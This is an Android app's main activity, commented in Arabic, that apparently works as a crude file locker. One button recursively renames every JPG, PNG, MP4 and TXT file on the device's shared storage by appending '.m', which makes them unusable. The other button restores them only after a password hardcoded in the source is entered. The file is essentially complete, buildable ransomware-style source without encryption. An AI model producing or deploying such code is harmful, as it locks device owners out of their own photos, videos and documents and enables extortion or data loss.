package com.my.newproject5;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.os.AsyncTask;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import java.io.File;

public class MainActivity extends Activity {

    private Button button1;
    private Button buttonDelete; // زر الحذف
    private final String PASSWORD = "7610150"; // كلمة السر

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        initialize();
    }

    private void initialize() {
        button1 = findViewById(R.id.button1);
        buttonDelete = findViewById(R.id.buttonDelete); // تهيئة زر الحذف

        button1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                addExtensionToFiles(); // استدعاء الدالة لإضافة اللاحقة
            }
        });

        buttonDelete.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                showPasswordDialog(); // استدعاء دالة عرض حوار كلمة السر
            }
        });
    }

    // دالة لعرض حوار طلب كلمة السر
    private void showPasswordDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("أدخل كلمة السر");

        final EditText input = new EditText(this);
        builder.setView(input);

        builder.setPositiveButton("تأكيد", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                String enteredPassword = input.getText().toString();
                if (enteredPassword.equals(PASSWORD)) {
                    removeExtensionFromFiles(); // إذا كانت كلمة السر صحيحة، استدعاء دالة الحذف
                } else {
                    Toast.makeText(getApplicationContext(), "كلمة السر غير صحيحة!", Toast.LENGTH_SHORT).show();
                }
            }
        });
        builder.setNegativeButton("إلغاء", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.cancel(); // إلغاء الحوار
            }
        });

        builder.show(); // عرض الحوار
    }

    // دالة لإضافة اللاحقة ".m" للملفات (الصور، MP4، TXT)
    private void addExtensionToFiles() {
        new AsyncTask<Void, Void, String>() {
            @Override
            protected void onPreExecute() {
                super.onPreExecute();
                // يمكنك إظهار مؤشر التحميل هنا إذا كنت ترغب
            }

            @Override
            protected String doInBackground(Void... voids) {
                String directoryPath = "/storage/emulated/0/"; // تأكد من تحديث هذا المسار
                File directory = new File(directoryPath);
                return processFiles(directory, ".m"); // استدعاء دالة المعالجة
            }

            @Override
            protected void onPostExecute(String result) {
                super.onPostExecute(result);
                Toast.makeText(getApplicationContext(), result, Toast.LENGTH_SHORT).show(); // عرض النتيجة
            }
        }.execute(); // بدء التنفيذ
    }

    // دالة لحذف اللاحقة ".m" من الملفات
    private void removeExtensionFromFiles() {
        new AsyncTask<Void, Void, String>() {
            @Override
            protected void onPreExecute() {
                super.onPreExecute();
                // يمكنك إظهار مؤشر التحميل هنا إذا كنت ترغب
            }

            @Override
            protected String doInBackground(Void... voids) {
                String directoryPath = "/storage/emulated/0/"; // تأكد من تحديث هذا المسار
                File directory = new File(directoryPath);
                return processFiles(directory, ""); // استدعاء دالة المعالجة
            }

            @Override
            protected void onPostExecute(String result) {
                super.onPostExecute(result);
                Toast.makeText(getApplicationContext(), result, Toast.LENGTH_SHORT).show(); // عرض النتيجة
            }
        }.execute(); // بدء التنفيذ
    }

    // دالة لمعالجة الملفات وإضافة أو حذف اللاحقة
    private String processFiles(File directory, String extension) {
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    // استدعاء الدالة بشكل متكرر للتعامل مع المجلدات الفرعية
                    String result = processFiles(file, extension);
                    if (!result.equals("تمت العملية بنجاح.")) {
                        return result; // إرجاع أي خطأ
                    }
                } else if (file.isFile()) {
                    if (extension.equals(".m")) {
                        if (file.getName().endsWith(".jpg") || file.getName().endsWith(".png") || file.getName().endsWith(".mp4") || file.getName().endsWith(".txt")) {
                            String newFileName = file.getAbsolutePath() + extension;
                            File newFile = new File(newFileName);
                            if (!file.renameTo(newFile)) {
                                return "فشل في إضافة اللاحقة '.m' إلى: " + file.getName();
                            }
                        }
                    } else {
                        if (file.getName().endsWith(".m")) {
                            String originalFileName = file.getAbsolutePath().substring(0, file.getAbsolutePath().length() - 2);
                            File originalFile = new File(originalFileName);
                            if (!file.renameTo(originalFile)) {
                                return "فشل في حذف اللاحقة '.m' من: " + file.getName();
                            }
                        }
                    }
                }
            }
        }
        return "تمت العملية بنجاح."; // إرجاع رسالة نجاح
    }
}
